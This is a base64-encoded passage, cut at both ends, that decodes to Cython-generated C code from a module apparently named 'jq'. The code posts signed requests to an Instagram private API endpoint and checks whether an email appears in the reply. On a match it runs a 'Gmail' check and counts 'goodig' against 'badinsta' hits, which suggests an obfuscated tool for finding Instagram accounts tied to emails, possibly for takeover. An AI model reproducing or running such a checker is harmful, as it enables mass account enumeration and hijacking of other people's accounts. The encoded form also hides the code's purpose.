cHl4X2twX3VfMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDBfMiwgX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzc3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2lnbmVkX2JvZHksIF9fcHl4X3RfNikgPCAoMCkpIF9fUFlYX0VSUigwLCAzNzcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lnX3NpZ19rZXlfdmVyc2lvbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV80KSA8ICgwKSkgX19QWVhfRVJSKDAsIDM3NywgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X3ZfZGF0YSA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNyk7XG4gIF9fcHl4X3RfNyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfNiA9IE5VTEw7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzODYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wb3N0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzg2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuXG4gIFxuICBfX3B5eF90XzQgPSAxO1xuICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzMpKSkge1xuICAgIF9fcHl4X3RfNiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMyk7XG4gICAgYXNzZXJ0KF9fcHl4X3RfNik7XG4gICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzMpO1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpO1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8zLCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgIF9fcHl4X3RfNCA9IDA7XG4gIH1cbiAgI2VuZGlmXG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gMiA6IDApXSA9IHtfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfaV9pbnN0YWdyYW1fY29tX2FwaV92MV9hY2N9O1xuICAgIF9fcHl4X3RfMSA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMik7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM4NiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfdl9oZWFkZXJzLCBfX3B5eF90XzEsIF9fcHl4X2NhbGxhcmdzKzIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMzg2LCBfX3B5eF9MMV9lcnJvcilcbiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X2RhdGEsIF9fcHl4X3RfMSwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzODYsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fcHl4X3RfNyA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF8xKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzg2LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgfVxuICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RleHQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzODcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gIF9fcHl4X3ZfcmVzcG9uc2UgPSBfX3B5eF90XzM7XG4gIF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMTEgPSAoX19QeXhfUHlTZXF1ZW5jZV9Db250YWluc1RGKF9fcHl4X3ZfZW1haWwsIF9fcHl4X3ZfcmVzcG9uc2UsIFB5X0VRKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF8xMSA8IDApKSkgX19QWVhfRVJSKDAsIDM4OSwgX19weXhfTDFfZXJyb3IpXG4gIGlmIChfX3B5eF90XzExKSB7XG5cbiAgICBcbiAgICBfX3B5eF90XzcgPSBOVUxMO1xuICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR21haWwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzOTAsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfNCA9IDE7XG4gICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzEpKSkge1xuICAgICAgX19weXhfdF83ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xKTtcbiAgICAgIGFzc2VydChfX3B5eF90XzcpO1xuICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xLCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19weXhfdF80ID0gMDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgX19weXhfdl9lbWFpbH07XG4gICAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM5MCwgX19weXhfTDFfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICB9XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgICBcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dvb2RpZyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM5MiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlMb25nX0FkZE9iakMoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMSwgMSwgMSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM5MiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nb29kaWcsIF9fcHl4X3RfMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzOTIsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuXG4gICAgXG4gICAgX19weXhfdF8zID0gTlVMTDtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3BwcHApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzOTMsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgIF9fcHl4X3RfNCA9IDE7XG4gICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzcpKSkge1xuICAgICAgX19weXhfdF8zID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF83KTtcbiAgICAgIGFzc2VydChfX3B5eF90XzMpO1xuICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzcpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF83LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19weXhfdF80ID0gMDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMywgTlVMTH07XG4gICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzcsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDEtX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM5MywgX19weXhfTDFfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICB9XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG5cbiAgICBcbiAgICBnb3RvIF9fcHl4X0wzO1xuICB9XG5cbiAgXG4gICB7XG4gICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRpbnN0YSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM5NSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgX19weXhfdF83ID0gX19QeXhfUHlMb25nX0FkZE9iakMoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMSwgMSwgMSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM5NSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRpbnN0YSwgX19weXhfdF83KSA8ICgwKSkgX19QWVhfRVJSKDAsIDM5NSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG5cbiAgICBcbiAgICBfX3B5eF90XzEgPSBOVUxMO1xuICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHBwcCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM5NiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgX19weXhfdF80ID0gMTtcbiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMykpKSB7XG4gICAgICBfX3B5eF90XzEgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzMpO1xuICAgICAgYXNzZXJ0KF9fcHl4X3RfMSk7XG4gICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xKTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzMsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX3B5eF90XzQgPSAwO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICB7XG4gICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xLCBOVUxMfTtcbiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMywgX19weXhfY2FsbGFyZ3MrX19weXhfdF80LCAoMS1fX3B5eF90XzQpIHwgKF9fcHl4X3RfNCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzk2LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgIH1cbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgfVxuICBfX3B5eF9MMzo7XG5cbiAgXG5cbiAgXG4gIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gIGdvdG8gX19weXhfTDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygianEuY2hlY2tfb24iLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19weXhfciA9IE5VTEw7XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3VhKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2Rldik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9kZXZpY2VfaWQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdXVpKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlYWRlcnMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZGF0YSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9yZXNwb25zZSk7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmpxXzE3cmFuZF9pZHMoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbik7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMmpxXzE3cmFuZF9pZHMgPSB7InJhbmRfaWRzIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18yanFfMTdyYW5kX2lkcywgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmpxXzE3cmFuZF9pZHMoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbikge1xuICBQeU9iamVjdCAqX19weXhfdl9iYmsgPSAwO1xuICBQeU9iamVjdCAqX19weXhfdl9JZG8gPSAwO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJncztcbiAgI2VuZGlmXG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlcztcbiAgUHlPYmplY3QqIHZhbHVlc1syXSA9IHswLDB9O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInJhbmRfaWRzICh3cmFwcGVyKSIsIDApO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7XG4gICNlbHNlXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICNlbmRpZlxuICAjZW5kaWZcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7XG4gIHtcbiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYmssJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9JZG8sMH07XG4gICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7XG4gICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0wzX2Vycm9yKVxuICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHtcbiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHtcbiAgICAgICAgY2FzZSAgMjpcbiAgICAgICAgdmFsdWVzWzFdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDEpO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDE6XG4gICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICBjYXNlICAwOiBicmVhaztcbiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjtcbiAgICAgIH1cbiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7XG4gICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAicmFuZF9pZHMiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQwMywgX19weXhfTDNfZXJyb3IpXG4gICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMjsgaSsrKSB7XG4gICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgicmFuZF9pZHMiLCAxLCAyLCAyLCBpKTsgX19QWVhfRVJSKDAsIDQwMywgX19weXhfTDNfZXJyb3IpIH1cbiAgICAgIH1cbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDIpKSB7XG4gICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgIH0gZWxzZSB7XG4gICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgdmFsdWVzWzFdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDEpO1xuICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MM19lcnJvcilcbiAgICB9XG4gICAgX19weXhfdl9iYmsgPSB2YWx1ZXNbMF07XG4gICAgX19weXhfdl9JZG8gPSB2YWx1ZXNbMV07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJyYW5kX2lkcyIsIDEsIDIsIDIsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDQwMywgX19weXhfTDNfZXJyb3IpXG4gIF9fcHl4X0w2X3NraXA6O1xuICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lO1xuICBfX3B5eF9MM19lcnJvcjo7XG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJqcS5yYW5kX2lkcyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIE5VTEw7XG4gIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJqcV8xNnJhbmRfaWRzKF9fcHl4X3NlbGYsIF9fcHl4X3ZfYmJrLCBfX3B5eF92X0lkbyk7XG5cbiAgXG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCko